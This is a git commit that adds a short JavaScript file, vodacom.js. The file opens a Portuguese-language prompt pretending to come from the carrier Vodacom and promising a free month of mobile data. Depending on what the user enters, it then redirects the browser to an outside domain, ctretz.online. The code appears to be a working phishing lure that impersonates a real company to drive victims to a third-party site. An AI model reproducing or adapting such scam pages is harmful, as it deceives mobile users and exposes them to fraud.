30f946cb09f10b72141173e737c9346c1e2131a6
newetijazz14 <newetijazz14@gmail.com>
2026-02-07 16:12:37 +0100

    Create vodacom.js

---
+++ vodacom.js
@@ -0,0 +1,5 @@
+var password = 'ATIVE 1 MÊS DE DADOS GRÁTIS'
+password=prompt('Vodacom: Parabéns! Seu número de celular está qualificado para receber 1 mês de dados grátis. Clique em OK para ativar agora.','ATIVE 1 MÊS DE DADOS GRÁTIS');
+if (password != 'ATIVE 1 MÊS DE DADOS GRÁTIS') {
+location.href='https://www.ctretz.online/vodacom';
+}
